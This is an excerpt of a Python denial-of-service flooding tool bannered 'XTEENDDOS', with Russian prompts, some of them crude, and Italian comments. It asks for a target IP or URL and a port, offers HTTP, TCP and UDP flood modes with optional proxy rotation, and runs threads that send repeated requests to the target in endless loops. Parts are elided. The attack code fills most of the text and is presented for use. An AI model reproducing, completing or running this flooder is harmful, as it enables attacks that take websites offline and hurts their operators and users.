...
try:
	...
	print ("ТЦП И ЮДП НЕ МОЖЕТ РАБОТАТ НА ВАШЕМ ГОВНОУСТРОЙСТВЕ.") # printa questo

os.system("ls")
os.system('clear')

print(colored("""   _  _____________________   ______  ____       _____
  | |/ /_  __/ ____/ ____/ | / / __ \/ __ \____ / ___/
  |   / / / / __/ / __/ /  |/ / / / / / / / __ \\__ \ 
 /   | / / / /___/ /___/ /|  / /_/ / /_/ / /_/ /__/ / 
/_/|_|/_/ /_____/_____/_/ |_/_____/_____/\____/____/  
                                                      """, 'red'))
...
def starturl(): # in questa funzione setto l'url per renderlo usabile per il futuro settaggio delle richieste HTTP.
	...
	url = input("\nВставь IP или ССЫЛКУ: ").strip()

	if url == "":
		print ("Дурак ссылку вставь.")
		starturl()
...
def floodmode(): # la scelta della modalitÃ  di attacco
	global choice1
	choice1 = input("HTTP '0', TCP '1', UDP '2': ")
	if choice1 == "0":
		proxymode()
	elif choice1 == "1":
		try:
...
def floodport():
	global port
	try:
		port = int(input("Введи порт сайта для ддоса: "))
...
def proxymode():
	global choice2
	choice2 = input("Хочешь юзать прокси? Введи 'y' если да: ")
	if choice2 == "y":
		choiceproxysocks()
	else:
		numthreads()
...
def begin():
	choice6 = input("Нажми 'Enter' для старта: ")
	if choice6 == "":
		loop()
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.send(p) # ed invia
				print ("Запросы отправлены от " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2),int(port))) # si connette
				s.send(p) # ed invia
				print (str(proxy[0]) + " Подключился к сайту") # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(p)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
	...
	def run(self): # la funzione che da' le istruzioni ai vari threads
		...
		while True:
			try:
				...
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("@ ", self.counter) # print req + counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
